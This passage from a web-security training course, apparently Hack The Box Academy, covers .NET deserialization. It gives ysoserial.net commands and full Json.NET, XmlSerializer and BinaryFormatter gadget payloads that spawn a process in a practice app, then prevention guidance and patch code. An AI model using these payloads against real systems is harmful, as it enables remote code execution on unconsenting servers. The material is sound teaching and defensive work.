Usage is fairly straightforward. We can download the latest version from the [Releases](https://github.com/pwntester/ysoserial.net/releases) page, and simply extract the ZIP file after it is downloaded. The syntax is explained in the repository's `README.md` file, however, the most important arguments are:

- `-f` to specify the `Formatter`, e.g. `Json.NET`, `XmlSerializer`, `BinaryFormatter`
- `-g` to specify the `Gadget`, e.g. `ObjectDataProvider`, `TypeConfuseDelegate`
- `-c` to specify the `Command`, e.g. `calc`
- `-o` to specify the `Output` mode, e.g. `Base64` or `Raw` for plaintext

```
.\ysoserial.exe -f [Formatter] -g [Gadget] -c [Command] -o [Output]

```

`YSoSerial.NET` provides support for many more `gadgets` and `formatters` than the few we covered in this module, however, they all work similarly. We will not be covering any others, but if you are interested in learning more on your own time, `YSoSerial.NET` is open source, and there are many blog posts/white papers by researchers that detail the various technicalities.

## Example 1: JSON, Remember Me Cookie

Let's take a look at how we could generate a payload for the first vulnerability we exploited; the `"Remember Me"` cookie which was (de)serialized using `Json.NET`. We will pass:

- `Json.Net` as the `Formatter (-f)`
- `ObjectDataProvider` as the `Gadget (-g)`
- `notepad` and the `Command (-c)`
- `Raw` as the `Output (-o)` so that we get plaintext JSON

All together, the command looks like this:

```powershell
PS C:\htb> .\ysoserial.exe -f Json.Net -g ObjectDataProvider -c "notepad" -o Raw

```

Running the command, the output we get looks very similar to the payload we developed manually:

```json
{
    '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
    'MethodName':'Start',
    'MethodParameters':{
        '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        '$values':['cmd', '/c notepad']
    },
    'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}

```

If we copy-paste the payload it gave us into the `TTREMEMBER` cookie and log out of `TeeTrove`, then we see that a `notepad.exe` process is spawned as expected.

![image](https://academy.hackthebox.com/storage/modules/240/3/58.png)

## Example 2: XML, Tee Import Feature

Let's look at how we could use `YSoSerial.NET` to generate a payload for the second vulnerability; the `Tee Import` feature which took a serialized `XML` string as input to `XmlSerializer`.

The command remains the same, changing only the selected formatter from `Json.Net` to `XmlSerializer`:

```powershell
PS C:\htb> .\ysoserial.exe -f XmlSerializer -g ObjectDataProvider -c "notepad" -o Raw

```

The output `YSoSerial.NET` gives us is similar to the payload we developed with the main difference being the `XAML` string passed to `XamlReader.Parse` is wrapped inside a `ResourceDictionary` whereas our payload passed a `string`:

```xml
<?xml version="1.0"?>
<root type="System.Data.Services.Internal.ExpandedWrapper`2[[System.Windows.Markup.XamlReader, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089">
    <ExpandedWrapperOfXamlReaderObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" >
        <ExpandedElement/>
        <ProjectedProperty0>
            <MethodName>Parse</MethodName>
            <MethodParameters>
                <anyType xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xsi:type="xsd:string">
                    <![CDATA[<ResourceDictionary xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation" xmlns:d="http://schemas.microsoft.com/winfx/2006/xaml" xmlns:b="clr-namespace:System;assembly=mscorlib" xmlns:c="clr-namespace:System.Diagnostics;assembly=system"><ObjectDataProvider d:Key="" ObjectType="{d:Type c:Process}" MethodName="Start"><ObjectDataProvider.MethodParameters><b:String>cmd</b:String><b:String>/c notepad</b:String></ObjectDataProvider.MethodParameters></ObjectDataProvider></ResourceDictionary>]]>
                </anyType>
            </MethodParameters>
            <ObjectInstance xsi:type="XamlReader"></ObjectInstance>
        </ProjectedProperty0>
    </ExpandedWrapperOfXamlReaderObjectDataProvider>
</root>

```

This time, however, we can't just copy-paste the payload. If you remember from a previous section, the type needed to be specified, and the `ExpandedWrapperOfXaml<SNIP>` node needed to be renamed to `Tee`. Once we make the changes, the payload does work as intended, resulting in a `notepad.exe` process spawning, but this highlights the importance of understanding how the attack works so that we can adapt payloads to work in the specific scenarios we come across:

![image](https://academy.hackthebox.com/storage/modules/240/3/59.png)

## Example 3: Binary, Authentication Cookie

For the last example, let's take a look at using `YSoSerial.NET` to exploit the authentication cookie, which used `BinaryFormatter` for (de-)serialization.

Generating a payload for `BinaryFormatter` is as simple as running the following command:

```powershell
PS C:\htb> .\ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c 'notepad' -o base64

```

However, as you should expect, this payload will not work due to the cookie validation that goes on before deserialization. Once again this payload will need to be modified to work with `TeeTrove`, but this is not very difficult when we have the decompiled source code to aid us in development:

```csharp
private static readonly string AUTH_COOKIE_SECRET = "916344<SNIP>";

private static string createSHA256HashB64(string session_b64)
{
    <SNIP>
}

static void Main(string[] args)
{
    string ysoserial_payload_b64 = "AAEAAAD/////AQAAAAAAA<SNIP>";
    string authCookieVal = ysoserial_payload_b64 + "." + createSHA256HashB64(ysoserial_payload_b64);
    Console.WriteLine(authCookieVal);
}

```

With this short program to turn the `YSoSerial.NET` payload into a usable payload for `TeeTrove`, exploitation works as expected, but once again this is an example of why it is important to understand how to do things manually in case the automated tools can not do exactly what we want.

![image](https://academy.hackthebox.com/storage/modules/240/3/60.png)


# Preventing Deserialization Vulnerabilities

## Introduction

With `vulnerability assessment` and `exploit development` covered, let's look at `deserialization` from a `defender/developers` point of view, and discuss what can be done to `prevent deserialization vulnerabilities` from occurring.

## Guidelines

#### 1\. Avoid Deserializing User Input

The most effective way to prevent `deserialization` vulnerabilities from being exploited, is to `never deserialize user-input`. If an attacker can not control the `serialized` input, then no payload can be passed to the `deserialization` method.

#### 2\. Avoid Unnecessary Deserialization

Sometimes it is not necessary to use `serialization` to store data. For example, the `"Remember Me"` token in `TeeTrove` could have easily been a `JWT` or just plain `JSON`, neither of which would have required `deserialization`.

#### 3\. Use Secure Serialization Mechanisms

Avoid using `serialization` mechanisms such as `BinaryFormatter` which are known to have issues. For `.NET`, Microsoft [recommends](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide#preferred-alternatives) using the following `serializers`:

- [XmlSerializer](https://learn.microsoft.com/en-us/dotnet/api/system.xml.serialization.xmlserializer?view=net-7.0) for XML
- [DataContractSerializer](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.serialization.datacontractserializer?view=net-7.0) for XML
- [BinaryReader](https://learn.microsoft.com/en-us/dotnet/api/system.io.binaryreader?view=net-7.0) and [BinaryWriter](https://learn.microsoft.com/en-us/dotnet/api/system.io.binarywriter?view=net-7.0) for XML and JSON
- [System.Text.JSON](https://learn.microsoft.com/en-us/dotnet/api/system.text.json?view=net-7.0) for JSON

However, relying solely on these classes does not guarantee the total elimination of deserialization vulnerabilities. For instance, the second vulnerability in `TeeTrove` involved abusing `XmlSerializer`.

#### 4\. Use Explicit Types

Many `serializers` in `.NET` allow developers to specify explicit types during `deserialization`, which prevents objects of other types from being parsed. For example, with `XmlSerializer` an object type must be passed in the constructor. Unless the user can control this type (like in `TeeTrove`), it will not be possible to `deserialize` objects of any other type.

```csharp
XmlSerializer xs = new XmlSerializer(typeof(Person));
Person p = (Person)xs.Deserialize(...);

```

#### 5\. Use Signed Data

Cryptographically `signing` serialized data that users can modify is a robust defensive mechanism to hinder exploitation. For example, the `authentication` cookie used by `TeeTrove` was signed with a secret key, and if we did not have access to the source code, we would not have been able to generate a valid cookie that would be `deserialized`.

When choosing an algorithm to sign the data, it is important to consider that some algorithms are more secure than others. For example, a simple `MD5` hash could be relatively simply brute-forced.

#### 6\. Least Possible Privileges

Finally, running web servers while adhering to the `Principle of Least Privileges` ( `PoLP`) is a recommended defensive security best practice. For an attacker exploiting a deserialization vulnerability and landing a reverse shell on a web server, implementing `PoLP` could mean the difference between causing limited damage (for example, leaking a database) or a catastrophic one (compromising the entire Active Directory domain).


# Patching Deserialization Vulnerabilities

## Introduction

Now that we have discussed how to `prevent deserialization` vulnerabilities from occuring, let's take a look at `TeeTrove` specifically and turn the theory into practice.

## Example 1: JSON, Remember Me Cookie

Let's see how we can patch the `"Remember Me"` functionality, so that it is no longer `vulnerable` to a `deserialization` attack. The two functions defined in `RememberMeUtil` are `createCookie` and `validateCookieAndReturnUser`, which return `HttpCookie` and `CustomMembershipUser` objects respectively.

```csharp
// RememberMeUtil.cs:13
public static HttpCookie createCookie(CustomMembershipUser user)
{
    <SNIP>
}

// RememberMeUtil.cs:27
public static CustomMembershipUser validateCookieAndReturnUser(string cookie)
{
    <SNIP>
}

```

Right now, the serialized data looks like this:

```js
{"Username":"pentest","Token":"5EAEFIHPD7CLIM005474HKZK54PL8ZZP"}

```

Firstly, this is not data that needs to be serialized, and secondly, there is nothing preventing the user from tampering with the data. Let's address both of these issues by using a JSON Web Token (JWT) instead, which does not require deserialization and contains a signature to prevent tampering.

To create a `JWT`, we will need to install the [Jwt.Net](https://github.com/jwt-dotnet/jwt) package with the `NuGet Package Manager`.

![image](https://academy.hackthebox.com/storage/modules/240/4/2.png)

With the package installed, we can modify the `createCookie` method like so (original code is commented out). Here we are generating a `JWT` which contains the two claims ( `Username` and `RememberToken`) and is signed with a secret key ( `JWT_SECRET`) to prevent tampering.

```csharp
private static readonly byte[] JWT_SECRET = Encoding.UTF8.GetBytes("Gc#623Fq234J!^dE");

<SNIP>

public static HttpCookie createCookie(CustomMembershipUser user)
{
    // RememberMe rememberMe = new RememberMe(user.Username, user.RememberToken);
    // string jsonString = JsonConvert.SerializeObject(rememberMe);

    // HttpCookie cookie = new HttpCookie(REMEMBER_ME_COOKIE_NAME, jsonString);

    string jwt = JwtBuilder.Create()
                           .WithAlgorithm(new HMACSHA256Algorithm())
                           .WithSecret(JWT_SECRET)
                           .AddClaim("Username", user.Username)
                           .AddClaim("RememberToken", user.RememberToken)
                           .Encode();

    HttpCookie cookie = new HttpCookie(REMEMBER_ME_COOKIE_NAME, jwt);
    cookie.Secure = true;
    cookie.HttpOnly = true;
    cookie.Expires = DateTime.Now.AddDays(30);

    return cookie;
}

```

Now when we log into the web application with the `Remember Me` checkbox selected, we can see that the value of the `TTREMEMBER` cookie is a `base64`-encoded string.

![image](https://academy.hackthebox.com/storage/modules/240/4/3.png)

Copy-pasting the value into [jwt.io](https://jwt.io), we can take a look at the stored data:

![image](https://academy.hackthebox.com/storage/modules/240/4/4.png)

Regarding the `validateCookieAndReturnUser` method, we can make the following changes to decode the `JWT` instead of the original deserialization. Notice the call to `MustVerifySignature`, which ensures a valid signature before decoding anything.

```csharp
public static CustomMembershipUser validateCookieAndReturnUser(string cookie)
{
    try
    {
        //RememberMe rememberMe = (RememberMe)JsonConvert.DeserializeObject(
        //    cookie,
        //    new JsonSerializerSettings()
        //    {
        //        TypeNameHandling = TypeNameHandling.All
        //    }
        //);
        //CustomMembershipUser User = (CustomMembershipUser)Membership.GetUser(rememberMe.Username, false);
        //return (User.RememberToken == rememberMe.Token) ? User : null;

        IDictionary<string, object> claims = JwtBuilder.Create()
                         .WithAlgorithm(new HMACSHA256Algorithm())
                         .WithSecret(JWT_SECRET)
                         .MustVerifySignature()
                         .Decode<IDictionary<string, object>>(cookie);

        CustomMembershipUser User = (CustomMembershipUser)Membership.GetUser(claims["Username"].ToString(), false);
        return (User.RememberToken.Equals(claims["Token"].ToString())) ? User : null;
    }
    catch (Exception)
    {
        return null;
    }
}

```

With these few simple changes, the `"Remember Me"` feature is no longer vulnerable to `deserialization attacks`.

## Example 2: XML, Tee Import Feature

Now let's shift our attention to the `Tee` import feature. In this case, `XmlSerializer` was used which is not necessarily a problem. If you remember from the previous section, this serializer is actually recommended as a secure option by `Microsoft`. The only issue in `TeeTrove` was that the `Type` which is passed to the constructor is controllable by the user. If we simply hardcode this value then exploiting this `deserialization` will no longer be possible.

![image](https://academy.hackthebox.com/storage/modules/240/4/5.png)

In `Controllers.TeeController` we can make the following change:

```csharp
<SNIP>

string xml = Request.Form["xml"];
// string type = Request.Form["type"];

if (!xml.IsEmpty())
{
    XmlSerializer xs = new XmlSerializer(typeof(Tee), new XmlRootAttribute("Tee"));
    try
    {

        <SNIP>

```

And in `Views\Tees\Index.cshtml` we can remove this line since it is no longer necessary, and there is no reason to unecessarily disclose information about the structure of the project:

![image](https://academy.hackthebox.com/storage/modules/240/4/6.png)

Now when we try to run the payload, the `XML` is deserialized into a `Tee` object and no `calculator` or `notepad` is spawned. Of course the payload we provided was not a valid `Tee`, so all properties are either `0` or `null`:

![image](https://academy.hackthebox.com/storage/modules/240/4/7.png)

Although it is no longer possible to `exploit` this `deserialization`, it is a good idea to further add `input validation` so that invalid objects are not imported.

## Example 3: Binary, Authentication Cookie

Lastly, let's look at what we can do to patch the `deserialization` vulnerability regarding the `authentication cookie`. Currently `BinaryFormatter` is used for `serialization`, and we know that `Microsoft` recommends not using this at all, so let's use something else.

One good option would be to use a `JWT` again, since the information being stored does not necessarily need to be serialized, but since we already have signing implemented we can also just use `XmlSerializer` instead as a secure alternative.

Inside `Authentication.AuthCookieUtil` we will need to make the following changes (old lines commented out) so that `XmlSerializer` is used instead of `BinaryFormatter`, making sure that the `Session` type is explicitly specified.

```csharp
public static HttpCookie createSignedCookie(CustomMembershipUser user)
{
    // Create and serialize session object
    Session session = new Session(user.Id, user.Username, user.Email, (DateTimeOffset)DateTime.Now).ToUnixTimeMilliseconds());
    //BinaryFormatter bf = new BinaryFormatter();
    MemoryStream ms = new MemoryStream();
    //bf.Serialize(ms, session);
    XmlSerializer xs = new XmlSerializer(typeof(Session));
    xs.Serialize(ms, session);
    string session_b64 = Convert.ToBase64String(ms.ToArray());

    // Create MAC
    var hash_b64 = createSHA256HashB64(session_b64);

    // Combine
    string authCookieVal = session_b64 + "." + hash_b64;

    // Create cookie obj
    HttpCookie authCookie = new HttpCookie(AuthCookieUtil.AUTH_COOKIE_NAME, authCookieVal);
    authCookie.Secure = true;
    authCookie.HttpOnly = true;

    return authCookie;
}

```

Inside `Global.asax.cs` (decompiles as `MvcApplication`), we need to update the `deserialization` to use `XmlSerializer` again with the `Session` type specified:

```csharp
<SNIP>

if (AuthCookieUtil.validateSignedCookie(authCookie.Value))
{
    //BinaryFormatter bf = new BinaryFormatter();
    XmlSerializer xs = new XmlSerializer(typeof(Session));
    Session session = null;
    try
    {
        MemoryStream ms = new MemoryStream(Convert.FromBase64String(authCookie.Value.Split('.')[0]));
        //session = (Session)bf.Deserialize(ms);
        session = (Session)xs.Deserialize(ms);

        <SNIP>


```

And then the last necessary change is adding a parameterless constructor to the `Models.Session` class. This is just something that `XmlSerializer` requires, because when it `deserializes` an object it creates an instance with this constructor and then updates the properties one by one.

```csharp
public Session() { }

```

With all these changes in place, we can verify that the `authentication` system still works, except now the serialized object is now `XML`:

![image](https://academy.hackthebox.com/storage/modules/240/4/8.png)

Obviously, the payload targetting `BinaryFormatter` will no longer work, but we also know that a payload targeting `XmlSerializer` will not either, since the type is specified (as well as the data being signed).


# Skills Assessment

`Cerealizer`, a company specializing in producing custom cereals, has contracted you to conduct a penetration test on their web application, focusing on `deserialization` vulnerabilities.

As it is a whitebox penetration test, they have provided the deployment files for the application (refer to the attached `zip` file below).

Their website may be accessed at `http://SERVER-IP:8000`:

![](https://academy.hackthebox.com/storage/modules/240/5/1.png)


